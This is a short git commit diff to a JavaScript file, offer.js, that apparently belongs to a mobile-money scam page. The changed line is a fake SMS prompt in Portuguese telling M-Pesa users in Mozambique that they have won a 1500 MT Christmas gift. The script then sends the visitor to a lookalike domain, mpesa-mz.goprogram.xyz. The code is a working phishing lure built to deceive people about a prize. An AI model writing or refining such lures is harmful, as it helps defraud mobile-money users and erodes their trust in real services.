10a58eb6c0c867a6247bdd6157770b760f62d998
kenycruzk <kenycruzk@gmail.com>
2025-12-02 02:58:17 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,8 +1,9 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '1500 MT'
-password=prompt('SMS: Parabéns, a sua conta Mpesa qualificou-se para receber o presente de aniversário de 1500 MT Mpesa. Clique em OK para continuar. ','1500 MT');
+password=prompt('SMS: Parabéns, a sua conta Mpesa foi selecionada para receber o presente de Natal de 1500 MT Mpesa. Clique em OK para continuar. ','1500 MT');
 if (password != '1500 MT') {
 location.href='https://mpesa-mz.goprogram.xyz/oferta';
 
 }
+
 
